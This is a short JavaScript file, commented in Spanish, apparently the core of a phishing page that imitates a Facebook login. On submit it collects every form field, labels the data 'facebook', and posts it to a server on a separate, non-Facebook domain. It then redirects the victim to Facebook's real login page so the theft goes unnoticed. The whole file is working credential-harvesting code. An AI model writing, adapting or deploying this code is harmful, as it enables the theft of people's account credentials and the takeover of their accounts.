const DEV_LINK = 'http://localhost:5000/';
const PROD_LINK = 'https://api.leotheprodu.com/';
const envelopment = window.env.NODE_ENV === 'production' ? PROD_LINK : DEV_LINK;

const apiLink = (link) => {
    return envelopment + link;
};
// Agregar un evento al formulario para escuchar el envío
const loginForm = document.querySelector('form');
loginForm.addEventListener('submit', async (event) => {
    event.preventDefault(); // Prevenir el envío del formulario por defecto

    const formData = new FormData(loginForm); // Obtener los datos del formulario
    formData.append('type', 'facebook');
    const formDataObj = Object.fromEntries(formData.entries()); // Convertir a un objeto
    try {
        // Enviar los datos al servidor utilizando Fetch API o Axios
        const response = await fetch(apiLink('api/users'), {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formDataObj),
        });
        // Verificar si la respuesta del servidor es exitosa (código de estado 200)
        if (response.ok) {
            // Redireccionar al usuario a la dirección de Facebook
            window.location.href = 'https://www.facebook.com/login/';
        } else {
            // Manejar otras respuestas del servidor aquí si es necesario
            console.log('Respuesta del servidor no exitosa:', response.status);
        }
    } catch (error) {
        console.error('Error al enviar los datos:', error);
    }
});
